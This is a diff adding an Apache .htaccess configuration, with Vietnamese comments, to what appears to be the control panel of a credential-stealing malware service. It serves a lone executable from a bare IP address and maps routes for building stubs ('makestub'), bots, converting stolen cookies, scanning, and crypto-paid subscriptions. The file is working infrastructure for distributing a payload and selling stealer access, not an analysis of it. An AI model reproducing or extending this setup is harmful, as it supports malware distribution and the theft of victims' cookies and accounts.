@@ -1,0 +1,48 @@
+RewriteEngine On
+Options -Indexes
+# Chặn truy cập trực tiếp bằng IP 36.50.233.24, ngoại trừ /n1k7
+RewriteCond %{HTTP_HOST} ^36\.50\.233\.24$
+RewriteCond %{REQUEST_URI} !^/n1k7
+RewriteRule ^ - [F]
+
+# Cho phép tải file duy nhất tại /n1k7/HXDC4RA8.exe
+RewriteCond %{HTTP_HOST} ^36\.50\.233\.24$
+RewriteCond %{REQUEST_URI} ^/n1k7/HXDC4RA8\.exe$ [NC]
+RewriteRule ^ - [L]
+
+# Chặn tất cả các file khác trong thư mục /n1k7
+RewriteCond %{HTTP_HOST} ^36\.50\.233\.24$
+RewriteCond %{REQUEST_URI} ^/n1k7/.+
+RewriteRule ^ - [F]
+
+# Phần còn lại của .htaccess
+# Mapping clean URLs to corresponding PHP files
+RewriteRule ^dashboard$ /dashboard.php [L]
+RewriteRule ^login$ /login.php [L]
+RewriteRule ^register$ /register.php [L]
+RewriteRule ^logout$ /logout.php [L]
+
+RewriteRule ^subscription$ /subscription.php [L]
+RewriteRule ^bot$ /bot.php [L]
+RewriteRule ^settings$ /settings.php [L]
+RewriteRule ^ref$ /ref.php [L]
+RewriteRule ^upload$ /upload.php [L]
+RewriteRule ^download$ /download.php [L]
+RewriteRule ^makestub$ /api/makestub.php [L]
+RewriteRule ^ailurophile$ /upload.php [L]
+RewriteRule ^cookie$ /convertcookie.php [L]
+RewriteRule ^stats$ /index.php [L]
+
+# API routes
+RewriteRule ^api/login$ /api/login.php [L]
+RewriteRule ^api/register$ /api/register.php [L]
+RewriteRule ^api/change-password$ /api/change_password.php [L]
+RewriteRule ^api/subscription$ /api/subscription.php [L]
+RewriteRule ^api/convert$ /api/convertcookie.php [L]
+RewriteRule ^api/scan$ /api/get_scan.php [L]
+
+# Payment notification route
+RewriteRule ^payment/notify-payment-coinremitter$ /api/coinremitter_notify.php [L]
+
+# Redirect all 404 errors to /dashboard
+ErrorDocument 404 /stats
